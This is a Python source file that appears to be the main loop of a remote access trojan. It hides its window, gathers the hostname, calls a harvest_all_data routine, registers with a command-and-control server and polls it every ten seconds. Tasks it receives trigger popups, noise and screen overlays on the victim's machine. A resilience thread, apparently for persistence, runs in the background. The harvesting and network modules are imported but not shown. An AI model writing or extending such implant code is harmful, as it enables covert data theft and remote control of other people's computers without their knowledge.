import time
import threading
import socket
import traceback
import os
import tkinter as tk
import sys

# Import all modules at the top level for PyInstaller to find them
import actions
from harvester import harvest_all_data
from comms import register_with_c2, send_heartbeat
from resilience import manage_resilience

ENABLE_RESILIENCE = True

def process_tasks(tasks):
    """Parses and executes tasks received from the C2 server."""
    if not tasks:
        return
    for task in tasks:
        command = task.get("command")
        print(f"[*] Received command: {command}")
        if command == "show_popup":
            actions.show_popup(task.get("text", "Default Popup"))
        elif command == "toggle_noise":
            actions.toggle_noise()
        elif command == "toggle_overlay":
            actions.toggle_screen_overlay()

def payload_logic_thread():
    """
    This function contains the core C2 logic and runs in a background thread.
    """
    try:
        print("[*] Payload logic thread started.")
        if ENABLE_RESILIENCE:
            threading.Thread(target=manage_resilience, daemon=True).start()
            print("[*] Resilience thread started.")

        hostname = socket.gethostname()
        print(f"[*] Hostname found: {hostname}")
        
        initial_data = harvest_all_data()
        print("[*] Initial data harvest complete.")
        
        register_with_c2(hostname, initial_data)
        print("[*] Registration attempt finished.")

        print("[*] Entering main heartbeat loop...")
        while True:
            response = send_heartbeat()
            if response and "tasks" in response:
                process_tasks(response["tasks"])
            time.sleep(10) # Check in every 10 seconds

    except Exception as e:
        # If the background logic crashes, we log it.
        error_message = f"[!!!] Payload logic thread crashed:\n{traceback.format_exc()}"
        print(error_message)

if __name__ == "__main__":
    print("[*] Main thread started. Initializing GUI root...")
    # 1. The main thread immediately creates the Tkinter root window.
    gui_root = tk.Tk()
    gui_root.withdraw() # Hide the window completely.
    print("[*] GUI root initialized and hidden.")

    # 2. We pass the root window to our actions module so it knows how to schedule GUI work.
    actions.init_gui(gui_root)
    print("[*] Actions module initialized.")

    # 3. Start all the C2 harvesting and communication logic in a background daemon thread.
    c2_thread = threading.Thread(target=payload_logic_thread, daemon=True)
    c2_thread.start()
    print("[*] C2 logic thread has been launched in the background.")

    # 4. The main thread's ONLY job now is to run the tkinter event loop.
    print("[*] Handing control to the main GUI event loop.")
    gui_root.mainloop()